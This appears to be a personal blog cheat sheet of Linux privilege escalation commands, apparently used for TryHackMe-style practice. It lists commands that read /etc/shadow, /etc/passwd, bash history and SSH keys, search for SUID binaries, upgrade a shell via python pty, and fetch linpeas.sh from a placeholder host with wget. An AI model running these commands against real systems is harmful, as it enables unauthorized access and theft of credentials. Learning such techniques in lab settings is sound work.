---
title: CheatSheet
date: 2024-03-01 12:43:32 
categories: [CheatSheet]
tags: [kendimenotlar] 
image: https://tryhackme-images.s3.amazonaws.com/room-icons/04afd126bf7a729eec5ff41e5b9b1212.png
---

# Privilege Escalation

````
------------------------------------------------
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- cat /etc/crontab
- uname -r 
- python -m http.server 80 | wget http://IP/linpeas.sh
- ps aux | ps -ef
- cat /etc/passwd | cat /etc/shadow | cat /etc/group
- cat ~/.bash_history
- cat ~/.ssh/authorized_keys
- python -c 'import pty;pty.spawn("/bin/bash")'
-----------------------------------------------
````
